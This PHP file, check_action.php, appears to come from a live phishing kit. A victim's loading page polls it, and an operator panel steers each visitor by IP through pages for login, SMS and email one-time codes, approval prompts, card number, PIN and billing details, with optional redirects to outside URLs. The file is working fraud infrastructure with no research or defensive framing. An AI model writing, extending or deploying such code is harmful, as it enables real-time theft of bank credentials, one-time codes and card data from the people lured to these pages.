<?php
// ============================================================
//  check_action.php — Polled by loading.php every ~2s
//  Returns JSON with admin-set redirect, or wait signal
//  
// ============================================================
require_once 'config.php';

header('Content-Type: application/json; charset=utf-8');
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');

$ip = client_ip();
$state = get_state($ip);

if (!$state) {
    echo json_encode(array('status' => 'wait'));
    exit;
}

// Touch last_seen
$state['last_seen'] = date('Y-m-d H:i:s');
save_state($ip, $state);

// Has admin set a destination?
$action = isset($state['action']) ? $state['action'] : 'wait';

if ($action !== 'go') {
    echo json_encode(array('status' => 'wait', 'current_step' => $state['current_step'] ?? null));
    exit;
}

// Admin has set a destination. Consume it.
$destination = isset($state['destination']) ? $state['destination'] : null;

if (empty($destination)) {
    echo json_encode(array('status' => 'wait'));
    exit;
}

// Resolve destination: page name, error, or absolute URL
$redirect = null;
$delay = 0;

if (strpos($destination, 'error:') === 0) {
    $step = substr($destination, 6);
    $allowed = array('login', 'sms', 'emailotp', 'approve', 'card', 'pin', 'billing');
    if (!in_array($step, $allowed, true)) $step = 'login';
    $redirect = 'error.php?step=' . urlencode($step);
    $delay = 0;
} elseif (preg_match('#^(https?:)?//#i', $destination)) {
    // Absolute URL — external redirect
    $redirect = $destination;
    $delay = 2;
} else {
    // Treat as a relative PHP page
    $clean = ltrim($destination, '/');
    if (strpos($clean, '..') !== false) {
        // Refuse path traversal
        echo json_encode(array('status' => 'wait'));
        exit;
    }
    $redirect = $clean;
    $delay = 0;
}

// Clear action so it doesn't fire twice
$state['action'] = 'wait';
$state['destination'] = null;
$state['last_seen'] = date('Y-m-d H:i:s');
save_state($ip, $state);

echo json_encode(array(
    'status'   => 'go',
    'redirect' => $redirect,
    'delay'    => $delay,
    'current_step' => $state['current_step'] ?? null
));
exit;
?>